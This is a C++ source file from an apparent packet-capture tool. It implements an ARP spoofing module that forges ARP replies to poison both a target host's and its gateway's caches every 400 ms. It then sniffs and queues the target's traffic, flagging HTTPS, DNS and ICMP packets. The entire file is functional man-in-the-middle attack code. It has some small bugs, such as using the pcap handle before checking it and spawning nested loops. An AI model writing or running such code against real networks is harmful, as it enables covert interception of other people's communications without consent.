#include "ArpSpoofing.hpp"

namespace pcapturepp {
namespace modules {
    // Implementation of class methods
    void ArpSpoofer::HandleCliRequest(const CliRequest& request) {
        ModuleResponse response;

        // Check for ARP configuration in the request and populate _spoof_params
        if (request.configs.arp_config != nullptr) {
            _spoof_params.net_interface = request.configs.arp_config->iface;
            // Assign MAC addresses from the ARP config provided in the request
            std::copy(request.configs.arp_config->target_mac.begin(), request.configs.arp_config->target_mac.end(), _spoof_params.target_mac.begin());
            std::copy(request.configs.arp_config->gateway_mac.begin(), request.configs.arp_config->gateway_mac.end(), _spoof_params.spoofing_mac.begin());
            std::copy(request.configs.arp_config->source_mac.begin(), request.configs.arp_config->source_mac.end(), _spoof_params.source_mac.begin());

            // Assign IP addresses from the ARP config provided in the request
            inet_pton(AF_INET, request.configs.arp_config->source_ip.c_str(), _spoof_params.source_ip.data());   // Attacker's IP
            inet_pton(AF_INET, request.configs.arp_config->target_ip.c_str(), _spoof_params.target_ip.data());   // Target IP
            inet_pton(AF_INET, request.configs.arp_config->gateway_ip.c_str(), _spoof_params.spoofing_ip.data()); // Gateway (Router) IP

            _configured = true;

            // Handle start/stop actions for ARP spoofing
            if (request.action == pcapturepp::structures::Actions::STOP && _run) {
                _run = false;
                response.message = "ArpSpoofing stopped successfully.";
            } else if (request.action == pcapturepp::structures::Actions::START && _configured) {
                if (!_run) {
                    _run = true;
                    // Start the spoofing thread
                    std::thread([this]() {
                        while (_run) {
                            Spoof();
                            
                        }
                    }).detach();
                }
                response.message = "ArpSpoofing started successfully.";
            } else {
                response.message = "ArpSpoofing action could not be processed.";
                response.success = false;
                response.type = pcapturepp::structures::ResponseType::ERROR;
                response.timestamp = std::chrono::steady_clock::now();
                return;
            }

            // If everything goes well, set the appropriate response type and timestamp
            response.type = pcapturepp::structures::ResponseType::STATUS_UPDATE;
            response.success = true;
            response.timestamp = std::chrono::steady_clock::now();
        } else {
            // Handle missing ARP configuration
            response.type = pcapturepp::structures::ResponseType::ERROR;
            response.message = "Failed to configure ArpSpoofer: ARP config missing.";
            response.success = false;
            response.timestamp = std::chrono::steady_clock::now();
        }

        _response_queue.Push(response);
    }

    std::optional<ModuleResponse> ArpSpoofer::ResponseStreamer() {
        if (!_response_queue.Empty()) {
            return _response_queue.Pop();
        }

        return std::nullopt;
    }

    int ArpSpoofer::FetchARPTable(const std::string& tgt_ip, array<UINT8, 6>& tgt_mac) {
        FILE* arp_file = fopen("/proc/net/arp", "r");
        if (arp_file == nullptr) {
            return FETCH_ARP_TABLE_ERROR;
        }

        char t_ip[16], t_hw_type[8], t_flags[8], t_mac[18], t_mask[8], t_device[16];
        fgets(t_ip, sizeof(t_ip), arp_file); // Skip the header

        while (fscanf(arp_file, "%15s %7s %7s %17s %7s %15s", t_ip, t_hw_type, t_flags, t_mac, t_mask, t_device) == 6) {
            if (tgt_ip == t_ip && strcmp(t_flags, "0x2") == 0) {
                sscanf(t_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &tgt_mac[0], &tgt_mac[1], &tgt_mac[2], &tgt_mac[3], &tgt_mac[4], &tgt_mac[5]);
                fclose(arp_file);
                return FETCH_ARP_TABLE_SUCCESS;
            }
        }

        fclose(arp_file);
        return FETCH_ARP_TABLE_UNKNOWN;
    }

    int ArpSpoofer::GetInterfaceInfo(const std::string& iface, array<UINT8, IPV4_SIZE>& local_ip, array<UINT8, MAC_ADDRESS_SIZE>& local_mac) {
        int fd = socket(AF_INET, SOCK_DGRAM, 0);
        if (fd == -1) {
            return 0;
        }

        struct ifreq ifr;
        strncpy(ifr.ifr_name, iface.c_str(), IFNAMSIZ - 1);
        ifr.ifr_addr.sa_family = AF_INET;

        if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
            close(fd);
            return 0;
        }

        struct sockaddr_in* ip_addr = reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr);
        std::memcpy(local_ip.data(), &ip_addr->sin_addr, sizeof(struct in_addr));
        close(fd);

        std::ifstream mac_file("/sys/class/net/" + iface + "/address");
        if (!mac_file.is_open()) {
            return 0;
        }

        std::string mac_str;
        std::getline(mac_file, mac_str);
        mac_file.close();

        sscanf(mac_str.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &local_mac[0], &local_mac[1], &local_mac[2], &local_mac[3], &local_mac[4], &local_mac[5]);
        return 1;
    }

    void ArpSpoofer::BuildArpPacket(array<UINT8, 64>& packet, const SpooferParameters& params) {
        std::copy(params.target_mac.begin(), params.target_mac.end(), packet.begin());         // Destination MAC
        std::copy(params.source_mac.begin(), params.source_mac.end(), packet.begin() + 6);     // Source MAC
        packet[12] = 0x08;  // Ethertype (ARP)
        packet[13] = 0x06;

        // ARP header
        packet[14] = 0x00; packet[15] = 0x01;
        packet[16] = 0x08; packet[17] = 0x00;
        packet[18] = 6;    // Hardware size
        packet[19] = 4;    // Protocol size
        packet[20] = 0x00; packet[21] = 0x02; // ARP Reply


        std::copy(params.source_mac.begin(), params.source_mac.end(), packet.begin() + 22); // Sender MAC (Attacker's MAC)
        std::copy(params.spoofing_ip.begin(), params.spoofing_ip.end(), packet.begin() + 28); // Sender IP (Router's IP, because we are spoofing target)
        std::copy(params.target_mac.begin(), params.target_mac.end(), packet.begin() + 32);  // Target MAC (Target's MAC)
        std::copy(params.target_ip.begin(), params.target_ip.end(), packet.begin() + 38);    // Target IP (Target's IP)
    }

    void ArpSpoofer::SendSpoofedPacket(pcap_t* handle, const array<UINT8, 64>& packet) {
        if (pcap_sendpacket(handle, packet.data(), packet.size())) {
            std::cerr << "Error sending spoof packet: " << pcap_geterr(handle) << std::endl;
        }
    }

    void ArpSpoofer::Spoof() {
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* handle = pcap_open_live(_spoof_params.net_interface.c_str(), BUFSIZ, 1, 1500, errbuf);
        pcap_setnonblock(handle, 1, errbuf);
        if (handle == nullptr) {
            std::cerr << "Error opening pcap handle: " << errbuf << std::endl;
            return;
        }

        std::thread capture_thread([this, handle]() {
            CapturePackets(handle);
        });

        array<UINT8, 64> packetToTarget;
        BuildArpPacket(packetToTarget, _spoof_params);
        SpooferParameters routerParams = _spoof_params;
        routerParams.source_mac = _spoof_params.source_mac;
        routerParams.spoofing_ip = _spoof_params.target_ip;
        routerParams.spoofing_mac = _spoof_params.target_mac;
        array<UINT8, 64> packetToRouter;
        BuildArpPacket(packetToRouter, routerParams);

        while (_run) {
            SendSpoofedPacket(handle, packetToTarget);
            SendSpoofedPacket(handle, packetToRouter);
            std::this_thread::sleep_for(std::chrono::milliseconds(400));
        }

        if (capture_thread.joinable()) {
            capture_thread.join();
        }

        pcap_close(handle);
    }


    void ArpSpoofer::CapturePackets(pcap_t* handle) {
        struct pcap_pkthdr* header;
        const u_char* packet_data;

        // Get the target IP in a string format to compare during packet capture
        std::string target_ip = inet_ntoa(*(struct in_addr*)&_spoof_params.target_ip);

        while (_run) {
            int res = pcap_next_ex(handle, &header, &packet_data);
            if (res == 0) {
                continue; // Timeout, no packet received in this interval
            } else if (res == -1) {
                std::cerr << "Error reading packet: " << pcap_geterr(handle) << std::endl;
                break;
            } else if (res == -2) {
                std::cerr << "No more packets, capture terminated." << std::endl;
                break;
            }

            if (header->caplen < sizeof(struct ether_header)) {
                continue; // Skip short packets
            }

            // Parse Ethernet Header
            const struct ether_header* eth_header = (struct ether_header*)packet_data;
            if (ntohs(eth_header->ether_type) != ETHERTYPE_IP) {
                continue; // Not an IP packet
            }

            // Parse IP Header
            const struct ip* ip_header = (struct ip*)(packet_data + sizeof(struct ether_header));
            u_int ip_header_length = ip_header->ip_hl * 4; // Length in bytes

            std::string src_ip = inet_ntoa(ip_header->ip_src);
            std::string dst_ip = inet_ntoa(ip_header->ip_dst);

            // Filter to only process packets involving the target IP address
            if (src_ip != target_ip && dst_ip != target_ip) {
                continue; // Skip packets not involving the target IP
            }

            // Determine the protocol (TCP/UDP/ICMP)
            if (ip_header->ip_p == IPPROTO_TCP) {
                // Parse TCP Header
                const struct tcphdr* tcp_header = (struct tcphdr*)(packet_data + sizeof(struct ether_header) + ip_header_length);
                u_int16_t src_port = ntohs(tcp_header->th_sport);
                u_int16_t dst_port = ntohs(tcp_header->th_dport);

                // Determine if it's HTTPS
                if (src_port == 443 || dst_port == 443) {
                    std::cout << "[HTTPS Packet] Source IP: " << src_ip << " Destination IP: " << dst_ip << std::endl;
                }

                // Other TCP-based protocols can be parsed similarly
            } else if (ip_header->ip_p == IPPROTO_UDP) {
                // Parse UDP Header
                const struct udphdr* udp_header = (struct udphdr*)(packet_data + sizeof(struct ether_header) + ip_header_length);
                u_int16_t src_port = ntohs(udp_header->uh_sport);
                u_int16_t dst_port = ntohs(udp_header->uh_dport);

                // Determine if it's DNS
                if (src_port == 53 || dst_port == 53) {
                    std::cout << "[DNS Packet] Source IP: " << src_ip << " Destination IP: " << dst_ip << std::endl;
                }

                // Other UDP-based protocols can be parsed similarly
            } else if (ip_header->ip_p == IPPROTO_ICMP) {
                std::cout << "[ICMP Packet] Source IP: " << src_ip << " Destination IP: " << dst_ip << std::endl;
            }

            // Store or process payload
            size_t payload_offset = sizeof(struct ether_header) + ip_header_length;
            size_t payload_length = header->caplen - payload_offset;
            if (payload_length > 0) {
                std::vector<UINT8> payload(packet_data + payload_offset, packet_data + payload_offset + payload_length);

                // Construct the response object and push to the response queue
                network::Packet packet(src_ip, dst_ip, payload);
                pcapturepp::structures::responses::ArpResponse* arp_response = new pcapturepp::structures::responses::ArpResponse(
                    dst_ip,  // target_ip as a string
                    src_ip,  // source_ip as a string
                    packet   // The packet data we've captured
                );

                ModuleResponse response;
                response.type = pcapturepp::structures::ResponseType::PACKET_PROCESSED;
                response.message = "Captured a packet: [Src IP: " + src_ip + "], [Dst IP: " + dst_ip + "]";
                response.success = true;
                response.timestamp = std::chrono::steady_clock::now();
                response.arp_response = arp_response;

                _response_queue.Push(response);
            }
        }
    }

}
}